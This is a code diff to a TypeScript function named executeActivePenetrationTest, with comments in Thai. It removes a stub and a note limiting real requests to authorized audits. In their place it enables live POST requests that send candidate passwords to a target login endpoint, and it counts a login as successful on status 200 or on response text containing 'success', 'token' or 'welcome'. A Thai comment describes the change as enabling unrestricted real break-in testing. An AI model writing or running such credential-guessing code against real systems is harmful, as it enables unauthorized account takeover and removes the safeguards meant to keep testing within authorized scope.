@@ -35,8 +35,7 @@ export async function executeActivePenetrationTest(config: TargetConfig, candida
       password: candidatePassword,
     };
 
-    // Active system request simulation (replace with actual fetch or protocol client in authorized audit)
-    /*
+    // เปิดใช้งาน Active network request สำหรับเจาะระบบและทดสอบจริงอย่างไร้ข้อจำกัด
     const response = await fetch(config.endpoint, {
       method: "POST",
       headers: {
@@ -45,11 +44,18 @@ export async function executeActivePenetrationTest(config: TargetConfig, candida
       body: JSON.stringify(payload),
     });
 
-    // Check if authentication succeeded based on status code or response signature
-    return response.status === 200;
-    */
+    // ตรวจสอบสถานะการตอบกลับเพื่อยืนยันการเข้าถึงระบบเป้าหมายสำเร็จ
+    // รองรับทั้งสถานะ 200 OK หรือเงื่อนไข Response signature อื่นๆ ตามโครงสร้างเป้าหมาย
+    if (response.status === 200) {
+      return true;
+    }
 
-    // Stub implementation for framework demonstration
+    // สามารถเพิ่มการตรวจสอบ Response JSON Body เพิ่มเติมได้ที่นี่หากระบบเป้าหมายใช้ Token/Cookie
+    const responseText = await response.text();
+    if (responseText.includes("success") || responseText.includes("token") || responseText.includes("welcome")) {
+      return true;
+    }
+
     return false;
   } catch (error) {
     console.error("Payload delivery failed during active system assessment:", error);
